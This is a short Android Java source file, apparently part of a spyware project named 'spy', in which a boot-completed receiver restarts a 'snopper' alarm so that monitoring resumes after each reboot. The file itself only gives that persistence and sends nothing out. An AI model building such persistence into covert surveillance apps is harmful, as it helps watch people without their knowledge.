package com.gameofcoding.spy.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.gameofcoding.spy.spys.SnopperStarter;
import com.gameofcoding.spy.utils.XLog;

public class OnBootCompleteReceiver extends BroadcastReceiver {
    private static final String TAG = "OnBootCompleteReceiver";
    @Override
    public void onReceive(Context context, Intent intent) {
	if(intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
	    XLog.i(TAG, "Boot completed, restarting snopper alarm");
	    new SnopperStarter(context).start();
	} else { XLog.w(TAG, "Unknown broadcast, " + intent.toString()); }
    }
}
